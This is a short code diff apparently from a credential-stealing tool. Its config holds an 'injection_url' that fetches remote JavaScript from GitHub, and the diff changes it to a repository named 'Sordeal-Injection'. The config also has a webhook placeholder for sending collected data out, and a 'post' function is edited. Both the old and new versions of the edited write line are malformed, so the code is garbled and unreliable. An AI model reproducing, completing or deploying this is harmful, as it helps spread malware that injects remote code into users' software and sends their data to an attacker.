@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 16711718,
 
-    injection_url: "https://raw.githubusercontent.com/MySk84funishigh/M/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/SOrdeal/Sordeal-Injection/main/index.js",
     webhook: "%WEBHOOK%",
     
     Filter: {
@@ -251,7 +251,7 @@ const post = async (params) => {
         req.on("error", (err) => {
             console.log(err);
         });
-        req.write(res == ? n : params);
+        req.write(res == n, params);
         req.end();
     })
 
